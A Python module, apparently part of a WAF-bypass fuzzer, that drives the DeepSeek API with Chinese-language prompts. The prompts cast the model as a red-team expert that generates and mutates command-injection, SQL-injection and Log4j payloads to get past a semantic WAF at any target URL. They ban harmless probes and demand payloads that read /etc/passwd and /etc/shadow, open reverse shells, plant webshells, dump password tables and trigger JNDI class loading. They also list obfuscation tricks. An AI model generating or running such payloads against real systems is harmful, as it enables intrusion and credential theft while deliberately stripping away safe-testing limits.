# -*- coding: utf-8 -*-
"""
llm_engine.py  AI 交互接口 (DeepSeek 兼容)

【核心职责】
1. 封装 openai 库调用 DeepSeek API (base_url=https://api.deepseek.com)。
2. Chain-of-Thought Prompt 工厂：
   - generate_initial_payloads(vuln_type)  分析漏洞 + 制定策略 + 生成高危 Payload
   - mutate_payloads(failed_list, vuln_type)  分析拦截根因 + 新策略 + 变异 Payload
   均返回结构化 dict，包含 analysis / strategy / payloads 三个字段。
"""

import json
import re
from openai import OpenAI

# ---------------------------------------------------------------
# 全局客户端（惰性初始化）
# ---------------------------------------------------------------
_client: OpenAI | None = None


def init_client(api_key: str, base_url: str = "https://api.deepseek.com") -> OpenAI:
    global _client
    _client = OpenAI(api_key=api_key, base_url=base_url)
    return _client


def _get_client() -> OpenAI:
    if _client is None:
        raise RuntimeError("LLM 客户端未初始化，请先调用 init_client(api_key, base_url)")
    return _client


# ---------------------------------------------------------------
# 底层通用调用
# ---------------------------------------------------------------

def _repair_truncated_json(text: str) -> str:
    """修复被截断的 JSON：补全未闭合的字符串和括号。"""
    repaired = text
    # 统计未闭合的括号（排除字符串内的）
    depth_brace = 0
    depth_bracket = 0
    in_string = False
    escape_next = False
    for ch in text:
        if escape_next:
            escape_next = False
            continue
        if ch == '\\':
            escape_next = True
            continue
        if ch == '"' and not escape_next:
            in_string = not in_string
            continue
        if in_string:
            continue
        if ch == '{':
            depth_brace += 1
        elif ch == '}':
            depth_brace -= 1
        elif ch == '[':
            depth_bracket += 1
        elif ch == ']':
            depth_bracket -= 1
    # 闭合未完成的字符串
    if in_string:
        repaired += '"'
    # 闭合未完成的括号
    repaired += ']' * max(0, depth_bracket)
    repaired += '}' * max(0, depth_brace)
    return repaired


def _extract_json_array(text: str) -> list | None:
    """用括号计数提取第一个完整 JSON 数组（兼容 payload 内含 [] 字符）。"""
    start = text.find('[')
    if start < 0:
        return None
    depth = 0
    in_string = False
    escape_next = False
    for i in range(start, len(text)):
        ch = text[i]
        if escape_next:
            escape_next = False
            continue
        if ch == '\\':
            escape_next = True
            continue
        if ch == '"':
            in_string = not in_string
            continue
        if in_string:
            continue
        if ch == '[':
            depth += 1
        elif ch == ']':
            depth -= 1
            if depth == 0:
                try:
                    return json.loads(text[start:i + 1])
                except json.JSONDecodeError:
                    return None
    return None


def _extract_json_str(text: str, key: str) -> str:
    """从残缺 JSON 文本中提取字符串值（兼容转义引号）。"""
    # 匹配 "key": "value" — value 可以包含 \" 转义
    m = re.search(rf'"{key}"\s*:\s*"((?:[^"\\]|\\.)*)"', text, re.DOTALL)
    return m.group(1) if m else ""



def _last_resort_extract(text: str) -> list | None:
    """终极回退：从完全无法解析的文本中，用正则捞出所有 payload 候选字符串。

    当所有结构化 JSON 解析都失败时触发。匹配引号包裹的、长度 >=5 的字符串，
    排除纯描述/元数据的长文本值，返回可能为注入 payload 的列表。
    """
    _JSON_STRING_RE = re.compile(r'"((?:[^"\\]|\\.)*)"')

    # 优先找 "payloads" 后面的内容
    payloads_start = re.search(r'"payloads"\s*:\s*\[', text)
    if payloads_start:
        region = text[payloads_start.end():]
        candidates = _JSON_STRING_RE.findall(region)
    else:
        candidates = _JSON_STRING_RE.findall(text)

    seen = set()
    payloads = []
    for c in candidates:
        c_stripped = c.strip()
        if c_stripped and len(c_stripped) >= 5 and c_stripped not in seen:
            if len(c_stripped) > 300:  # 排除长文本（analysis/strategy 字段值）
                continue
            seen.add(c_stripped)
            payloads.append(c_stripped)

    return payloads if payloads else None


def _chat_json(
    prompt: str,
    model: str = "deepseek-v4-pro",
    temperature: float = 0.7,
    max_tokens: int = 4096,
) -> list | dict:
    """发送 Prompt，期望返回纯 JSON。带 max_tokens + 截断修复 + 多层回退。"""
    client = _get_client()

    for attempt in range(2):
        resp = client.chat.completions.create(
            model=model,
            temperature=temperature,
            max_tokens=max_tokens,
            messages=[{"role": "user", "content": prompt}],
        )
        raw = resp.choices[0].message.content.strip()
        finish = resp.choices[0].finish_reason or ""

        # 1. 摘取 markdown 代码块中的 JSON
        m = re.search(r"```(?:json)?\s*\n?([\s\S]*?)\n?```", raw)
        if m:
            raw = m.group(1).strip()

        # 2. 尝试直接解析
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            pass

        # 3. 截断修复（finish_reason == "length" 或明显不完整）
        if finish == "length" or not raw.rstrip().endswith(('}', ']', '"')):
            repaired = _repair_truncated_json(raw)
            try:
                result = json.loads(repaired)
                return result
            except json.JSONDecodeError:
                pass
            # 重试：翻倍 max_tokens
            if finish == "length" and attempt == 0:
                max_tokens *= 2
                continue

        # 4. 回退：用括号计数提取 payloads 数组
        arr = _extract_json_array(raw)
        if arr is None:
            # 也尝试提取 "payloads" 键对应的数组
            m = re.search(r'"payloads"\s*:\s*\[', raw)
            if m:
                arr = _extract_json_array(raw[m.start():])
        if arr and isinstance(arr, list) and len(arr) > 0:
            analysis = _extract_json_str(raw, "analysis")
            strategy = _extract_json_str(raw, "strategy")
            return {"analysis": analysis, "strategy": strategy, "payloads": arr}

        # 5. 终极回退：正则提取所有引号字符串作为 payload 候选
        arr = _last_resort_extract(raw)
        if arr and len(arr) > 0:
            analysis = _extract_json_str(raw, "analysis")
            strategy = _extract_json_str(raw, "strategy")
            return {"analysis": analysis, "strategy": strategy, "payloads": arr}

        # 已经重试过或非截断错误 → 不再重试
        if finish != "length":
            break

    raise ValueError(
        f"无法解析 LLM 返回的 JSON (finish={finish}, max_tokens={max_tokens}) "
        f"原始响应前 600 字符: {raw[:600]}"
    )


# ---------------------------------------------------------------
# 杀伤力要求（按漏洞类型）
# ---------------------------------------------------------------

_LETHALITY = {
    "cmdi": (
        "🔴【黑盒上下文推测与闭合 — 最高优先级、绝对强制】\n"
        "    你正在进行黑盒命令注入测试，后端拼接的命令上下文是未知的。\n"
        "    你必须根据目标 URL、路由路径、参数名来动态推断后端正运行的命令：\n"
        "      ▸ 参数名含 ip/host/addr/ping/target → 推测是 ping/nslookup/dig 等网络命令\n"
        "      ▸ 参数名含 file/path/doc/name → 推测是 cat/head/file 等文件读取命令\n"
        "      ▸ 参数名含 cmd/exec/run/shell → 推测是直接 shell 执行或 eval\n"
        "      ▸ 路由含 exec/cmd/shell/system → 推测是命令执行端点\n"
        "    基于推断结果，选择合适的命令分隔符或替换符：\n"
        "      ;  |  ||  &&  %0a（换行）  ``（反引号）  $()  %0d%0a\n"
        "    ❌ 绝对严禁：发送没有任何闭合/连接符的裸命令！\n"
        "      裸命令（如 nl /etc/passwd）会被当作前一个命令的参数，漏洞永远无法触发！\n"
        "    ✅ 每个 Payload 必须自带闭合/连接符，或采用 Polyglot 形式兼容多种上下文：\n"
        "      ✓ 带连接符: ;cat /etc/passwd   |cat /etc/passwd   %0aid%0a\n"
        "      ✓ Polyglot: |{cat,/etc/passwd}   ;$(cat /etc/passwd)   `cat /etc/passwd`\n"
        "      ✗ 裸命令(禁止): cat /etc/passwd   nl /etc/passwd   ls -la /tmp\n\n"
        "命令注入 Payload 必须执行高危操作且具备可验证的回显。\n"
        "    ❌ 严禁：id、whoami、ls、ping、echo test、pwd 等无害探路命令。\n"
        "    ❌ 严禁：touch、mkdir、wget、curl -o 等无回显的文件操作命令——\n"
        "       即使命令执行成功也不会有任何输出，Parser 无法提取证据，直接判为失败。\n"
        "    ❌ 严禁：创建文件后只用 ;ls 查看目录列表而不指定文件名——\n"
        "       如果目录中有残留的旧测试文件，ls 会一并列出导致假阳性判定。\n"
        "    ✅ 优先有回显：cat /etc/passwd、/bin/cat /etc/passwd、base64 /etc/passwd、\n"
        "       cat /etc/shadow、tail -n20 /etc/passwd、反弹 shell 等。\n"
        "    ✅ 若必须文件操作（如写 webshell），必须自包含三步骤：\n"
        "       第一步 rm -f 清理旧标记 → 第二步 创建文件 → 第三步 ls -la 验证新文件。\n"
        "       示例：'rm -f /tmp/fz_xyz && touch /tmp/fz_xyz && ls -la /tmp/fz_xyz'\n"
        "       标记文件名必须包含随机后缀（3+ 位随机字母数字），禁止通用名（如 test.txt）。\n"
        "       确保 ls 输出中出现的文件名不可能是上一轮残留的旧文件。"
    ),
    "sqli": (
        "🔴【黑盒上下文推测与闭合 — 最高优先级、绝对强制】\n"
        "    你正在进行黑盒 SQL 注入测试，后端 SQL 查询上下文是未知的。\n"
        "    你必须根据目标 URL、路由路径、参数名来动态推断后端 SQL 查询结构：\n"
        "      ▸ 参数名含 id/user_id/uid/num → 推测是 SELECT ... WHERE id=$input 数字型或字符型\n"
        "      ▸ 参数名含 search/keyword/query → 推测是 SELECT ... WHERE field LIKE '%$input%'\n"
        "      ▸ 参数名含 cat/category/sort/order → 推测是 ORDER BY / GROUP BY 注入\n"
        "      ▸ 路由含 sqli/sql/injection → 明确 SQL 注入端点\n"
        "    基于推断结果，选择合适的闭合方式：\n"
        "      ' 闭合  '-- 注释  '--+ 注释  '# 注释  ') 闭合括号  ')) 闭合双层括号\n"
        "    ❌ 绝对严禁：发送没有任何闭合符的裸 SQL 关键字！\n"
        "      裸关键字会被当作字符串值的一部分，永远无法改变查询语义！\n"
        "    ✅ 每个 Payload 必须自带闭合符，或采用 Polyglot 形式兼容多种上下文。\n\n"
        "    ⚠️【DVWA 靶场特征 — 必须以此为基线设计 Payload】\n"
        "    典型 DVWA SQLi 后端查询：\n"
        "      SELECT first_name, last_name FROM users WHERE user_id = '$id'\n"
        "    输出格式（<pre> 标签内）：\n"
        "      ID: 1\n      First name: admin\n      Surname: admin\n"
        "    users 表含: user_id, user, password, first_name, last_name, avatar\n"
        "    前端显示 2 列 → UNION SELECT 必须对齐 2 列。\n"
        "    先探测列数: ' ORDER BY 1# → 2# → 3#（报错=列数不够，确定列数后停止）\n"
        "    高价值目标: UNION SELECT user, password FROM users#\n\n"
        "SQL 注入 Payload 必须执行实际数据提取：UNION SELECT 拖库、"
        "查询 users/passwords 表、使用 GROUP_CONCAT 或 equivalent 聚合敏感字段。\n"
        "    ❌ 严禁使用：' OR 1=1 --、' AND 1=1 --、sleep(1)、ORDER BY n 等仅证明漏洞存在的无害 Payload。\n"
        "    ✅ 必须使用：UNION SELECT 提取用户数据/密码、information_schema 查表结构等。\n"
        "    ✅ 证据输出必须包含 First name:/Surname: 的键值对行、ASCII 表格行、"
        "或 information_schema 字段名 — Parser 需要这些特征才能识别为真实证据。"
    ),
    "log4j": (
        "Log4j Payload 必须触发实际的 JNDI 注入，指向可控的 LDAP/RMI 服务，"
        "执行任意类加载。严禁使用仅 DNS 探测的无害 Payload。"
    ),
}

# ---------------------------------------------------------------
# Prompt 1：初始 Payload 生成（CoT + 高杀伤力）
# ---------------------------------------------------------------

_INITIAL_PROMPT = (
    "你是一名顶尖的 Red-Team WAF 绕过专家。"
    "目标靶场存在 **{vuln_type}** 漏洞，前方部署了雷池/长亭语义级 WAF。\n\n"
    "## 目标信息\n"
    "   目标 URL：{target_url}\n"
    "   漏洞类型：{vuln_type}\n\n"
    "{kb_section}\n"
    "请按以下四步思维链 (Chain of Thought) 完成任务：\n\n"
    "## 第〇步：黑盒上下文推测（CMD/SQL 注入必做）\n"
    "分析目标 URL 的路由路径和参数名，推测后端可能拼接的命令/SQL 上下文。\n"
    "例如：参数名含 ip → 推测是 ping/nslookup；路由含 exec → 推测直接命令执行。\n"
    "基于推测结果，确定应使用的闭合/连接符类型。\n\n"
    "## 第一步：漏洞与防御分析\n"
    "分析该 {vuln_type} 漏洞的典型攻击面，"
    "推测语义 WAF 最可能部署的 2-3 条检测规则"
    "（如关键字黑名单、元字符过滤、语法解析等）。\n\n"
    "## 第二步：绕过策略\n"
    "基于上述分析，制定本轮 Payload 的核心绕过策略。"
    "明确说明将采用哪些具体的编码/混淆/变形手法，"
    "以及为什么这些手法能避开你推测的检测规则。\n\n"
    "## 第三步：生成 Payload\n"
    "生成 15 个高质量 Payload。\n\n"
    "### ⚠️  杀伤力强制要求（违反将判定为任务失败）：\n"
    "{lethality_requirement}\n\n"
    "### 变形手法覆盖：\n"
    "内联注释(/**/)、URL 编码(单层/双层)、双写关键字、注释截断(#\\n, --\\n)、\n"
    "大小写混淆、空格替代符(%0a,%0d,%09,+)、反引号/$()、管道符/分号串联、\n"
    "制表符替代空格、通配符、IFS 替代、换行注入等。\n\n"
    "### 输出格式（严格 JSON，不要任何额外文字）：\n"
    '{{"analysis": "对漏洞与WAF防御的分析", "strategy": "本轮绕过策略", "payloads": ["p1","p2",...]}}\n\n'
    "⚠️ JSON 内所有双引号必须转义为 \\\"，换行必须转义为 \\\\n，"
    "确保可被 Python json.loads 直接解析。"
)


def generate_initial_payloads(
    vuln_type: str,
    target_url: str = "",
    model: str = "deepseek-v4-pro",
    kb_context: str = "",
) -> dict:
    """生成初始 Payload，包含 CoT 推理。

    Args:
        vuln_type: 漏洞类型 (cmdi/sqli/log4j)
        target_url: 目标 URL（供 LLM 基于路由/参数名推测后端命令上下文）
        model: LLM 模型名
        kb_context: 历史 WAF 拦截经验（来自 waf_rules_kb.json 的压缩总结）

    Returns:
        {"analysis": str, "strategy": str, "payloads": list[str]}
    """
    vuln_name = {"sqli": "SQL 注入", "cmdi": "命令注入", "log4j": "Log4j 反序列化"}.get(
        vuln_type, vuln_type
    )
    lethality = _LETHALITY.get(vuln_type, "必须构造具有真实数据提取能力的高危 Payload。")
    prompt = _INITIAL_PROMPT.format(
        vuln_type=vuln_name,
        target_url=target_url,
        lethality_requirement=lethality,
        kb_section=kb_context,
    )
    result = _chat_json(prompt, model=model, max_tokens=8192)

    # 兼容旧格式：如果 LLM 返回的是纯数组，包装为 dict
    if isinstance(result, list):
        result = {"analysis": "", "strategy": "", "payloads": result}
    result.setdefault("analysis", "")
    result.setdefault("strategy", "")
    result.setdefault("payloads", [])
    return result


# ---------------------------------------------------------------
# Prompt 2：失败分析 + 变异生成（CoT）
# ---------------------------------------------------------------

_MUTATE_PROMPT = (
    "你是一名顶尖的 Red-Team WAF 绕过专家。"
    "以下 Payload **全部被 WAF 拦截（HTTP 403/406/501）**：\n\n"
    "{payload_list}\n\n"
    "## 目标信息\n"
    "   目标 URL：{target_url}\n"
    "   漏洞类型：{vuln_type}\n\n"
    "{kb_section}\n"
    "请按以下四步思维链 (Chain of Thought) 完成任务：\n\n"
    "## 第〇步：上下文回顾与重新推测\n"
    "回顾目标 URL 的路由和参数名，确认之前对后端命令上下文的推测是否仍然正确。\n"
    "如果被拦截的 Payload 都使用了同一种连接符（如全是 ; 开头），考虑换用其他分隔符。\n\n"
    "## 第一步：拦截根因分析\n"
    "逐一分析这些 Payload 的**共性特征**，推断 WAF 的具体检测规则。\n"
    "是被哪些关键字黑名单命中？还是被元字符组合触发？或者被语法解析检测？\n"
    "列出你认为最可能的 2-3 条拦截规则。\n\n"
    "## 第二步：新绕过策略\n"
    "基于根因分析，制定**与之前不同的**新绕过策略。\n"
    "说明为什么这次策略能避开上一步推断的规则。\n"
    "不要重复之前已经失败的手法。\n\n"
    "## 第三步：生成变异 Payload\n"
    "生成 15 个新的变异 Payload，根据漏洞类型采用不同高阶手法：\n\n"
    "### 通用手法：\n"
    "  - 双重/多重 URL 编码、Unicode 编码绕过\n"
    "  - 大小写随机混淆、关键词碎片化\n"
    "  - 换行注入组合(%0a%0d)、制表符(%09)替代空格\n"
    "  - 双写/多写关键字、括号/引号嵌套\n\n"
    "### SQLi 专属手法（{vuln_type} 为 SQL 注入时必须使用）：\n"
    "  - 内联注释变形：/*!50000UNION*/、/*!UNION*/、/**/UNI/**/ON\n"
    "  - 科学计数法绕过：1e0UNION、1.e(UNION)、.1UNION\n"
    "  - 浮点数前缀：1.0UNION、0x3aUNION\n"
    "  - 空白符替代：%09 %0a %0b %0c %0d %a0 /***/\n"
    "  - 关键字双写：UNIUNIONON、SELESELECTCT\n"
    "  - 括号嵌套：SELECT(column)FROM(table)\n"
    "  - 引号绕过：0x十六进制编码、CHAR()函数、反斜杠转义闭合\n"
    "  - 等价函数替换：GROUP_CONCAT↔CONCAT_WS、MID↔SUBSTRING\n"
    "  - MySQL专有：/*!50000*/版本条件注释、UNHEX()编码\n\n"
    "### CMDI 专属手法（{vuln_type} 为命令注入时必须使用）：\n"
    "  - 命令混淆：反引号、$()、通配符、IFS 替代、{{cmd,args}} 语法\n"
    "  - 路径变形：? * [a-z] 通配符绕过字面量正则\n"
    "  - 编码传输：base64/xxd 编码敏感文件内容\n\n"
    "### ⚠️  杀伤力强制要求（违反将判定为任务失败）：\n"
    "{lethality_requirement}\n\n"
    "### 输出格式（严格 JSON，不要任何额外文字）：\n"
    '{{"analysis": "拦截根因分析", "strategy": "新的绕过策略", "payloads": ["p1","p2",...]}}\n\n'
    "⚠️ JSON 内所有双引号必须转义为 \\\"，换行必须转义为 \\\\n，"
    "确保可被 Python json.loads 直接解析。"
)


def mutate_payloads(
    failed_payloads: list[str],
    vuln_type: str = "",
    target_url: str = "",
    model: str = "deepseek-v4-pro",
    kb_context: str = "",
) -> dict:
    """基于被拦截 Payload 做 CoT 分析并变异生成新 Payload。

    Args:
        failed_payloads: 上一轮被拦截的 payload 列表
        vuln_type: 漏洞类型
        target_url: 目标 URL（供 LLM 回顾上下文、调整连接符策略）
        model: LLM 模型名
        kb_context: 历史 WAF 拦截经验（来自 waf_rules_kb.json 的压缩总结）

    Returns:
        {"analysis": str, "strategy": str, "payloads": list[str]}
    """
    payload_list = "\n".join(f"- {p}" for p in failed_payloads)
    vuln_name = {"sqli": "SQL 注入", "cmdi": "命令注入", "log4j": "Log4j 反序列化"}.get(
        vuln_type, vuln_type
    )
    lethality = _LETHALITY.get(vuln_type, "必须构造具有真实数据提取能力的高危 Payload。")
    prompt = _MUTATE_PROMPT.format(
        payload_list=payload_list,
        vuln_type=vuln_name,
        target_url=target_url,
        lethality_requirement=lethality,
        kb_section=kb_context,
    )
    result = _chat_json(prompt, model=model, max_tokens=8192)

    if isinstance(result, list):
        result = {"analysis": "", "strategy": "", "payloads": result}
    result.setdefault("analysis", "")
    result.setdefault("strategy", "")
    result.setdefault("payloads", [])
    return result

